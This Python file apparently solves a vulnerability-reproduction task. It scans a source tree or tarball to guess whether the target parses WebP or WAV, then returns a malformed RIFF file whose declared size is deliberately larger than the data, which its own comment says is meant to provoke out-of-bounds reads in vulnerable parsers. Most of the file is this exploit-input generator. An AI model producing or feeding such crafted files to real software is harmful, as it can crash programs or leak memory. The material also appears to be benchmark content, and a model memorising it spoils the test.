import os
import tarfile
import struct
from typing import Tuple

def _le32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)

def _pad2(data: bytes) -> bytes:
    return data + (b"\x00" if (len(data) & 1) else b"")

def _make_riff(form_type: bytes, chunks: Tuple[Tuple[bytes, bytes], ...], riff_size_override: int) -> bytes:
    if len(form_type) != 4:
        form_type = (form_type + b"    ")[:4]
    body = bytearray()
    body += form_type
    for cid, cdata in chunks:
        if len(cid) != 4:
            cid = (cid + b"    ")[:4]
        body += cid
        body += _le32(len(cdata))
        body += _pad2(cdata)
    return b"RIFF" + _le32(riff_size_override) + bytes(body)

def _webp_poc() -> bytes:
    # RIFF size deliberately larger than actual buffer to provoke out-of-bounds reads in vulnerable parsers.
    # VP8X chunk data (10 bytes), then a harmless/unknown chunk with size 0.
    vp8x = b"\x00" * 10  # flags/reserved/width-1/height-1 all zeros => 1x1 canvas
    return _make_riff(
        b"WEBP",
        (
            (b"VP8X", vp8x),
            (b"JUNK", b""),
        ),
        riff_size_override=0x00000080,
    )

def _wave_poc() -> bytes:
    # Minimal valid 'fmt ' chunk, no 'data' chunk. RIFF size deliberately too large.
    # PCM, 1 channel, 8000 Hz, 16-bit.
    audio_format = 1
    num_channels = 1
    sample_rate = 8000
    bits_per_sample = 16
    block_align = num_channels * (bits_per_sample // 8)
    byte_rate = sample_rate * block_align
    fmt = struct.pack("<HHIIHH", audio_format, num_channels, sample_rate, byte_rate, block_align, bits_per_sample)
    return _make_riff(
        b"WAVE",
        (
            (b"fmt ", fmt),
        ),
        riff_size_override=0x00000080,
    )

def _scan_source_for_format(src_path: str) -> str:
    webp_score = 0
    wave_score = 0

    def score_path(p: str) -> None:
        nonlocal webp_score, wave_score
        pl = p.lower()
        if "webp" in pl:
            webp_score += 4
        if "vp8" in pl or "demux" in pl or "mux" in pl:
            webp_score += 2
        if "wav" in pl or "wave" in pl:
            wave_score += 4
        if "riff" in pl:
            webp_score += 1
            wave_score += 1
        if "dr_wav" in pl or "drwav" in pl:
            wave_score += 6

    def score_text(t: str) -> None:
        nonlocal webp_score, wave_score
        if "webp" in t:
            webp_score += 6
        if "webpdecode" in t or "webpgetinfo" in t:
            webp_score += 6
        if "webpdemux" in t:
            webp_score += 8
        if "vp8x" in t or "vp8l" in t or "vp8 " in t:
            webp_score += 3
        if "wave" in t:
            wave_score += 6
        if '"wave"' in t or "'wave'" in t:
            wave_score += 1
        if "fmt " in t or "fmt_chunk" in t:
            wave_score += 3
        if "dr_wav" in t or "drwav" in t:
            wave_score += 8
        if "sndfile" in t:
            wave_score += 3

    try:
        if os.path.isdir(src_path):
            total = 0
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    rp = os.path.relpath(p, src_path)
                    score_path(rp)
                    if total > 8_000_000:
                        continue
                    ext = os.path.splitext(fn)[1].lower()
                    if ext not in (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".rs"):
                        continue
                    try:
                        st = os.stat(p)
                        if st.st_size > 512_000:
                            continue
                        with open(p, "rb") as f:
                            b = f.read()
                        total += len(b)
                        score_text(b.decode("latin1", "ignore").lower())
                    except Exception:
                        pass
            return "webp" if webp_score >= wave_score else "wave"

        if tarfile.is_tarfile(src_path):
            total = 0
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                for m in members[:5000]:
                    if not m.isfile():
                        continue
                    score_path(m.name)
                for m in members[:1500]:
                    if not m.isfile():
                        continue
                    if total > 8_000_000:
                        break
                    name = m.name
                    ext = os.path.splitext(name)[1].lower()
                    if ext not in (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".rs"):
                        continue
                    if m.size <= 0 or m.size > 512_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = f.read()
                        total += len(b)
                        score_text(b.decode("latin1", "ignore").lower())
                    except Exception:
                        pass
            return "webp" if webp_score >= wave_score else "wave"
    except Exception:
        pass

    return "webp"

class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _scan_source_for_format(src_path)
        if fmt == "wave":
            return _wave_poc()
        return _webp_poc()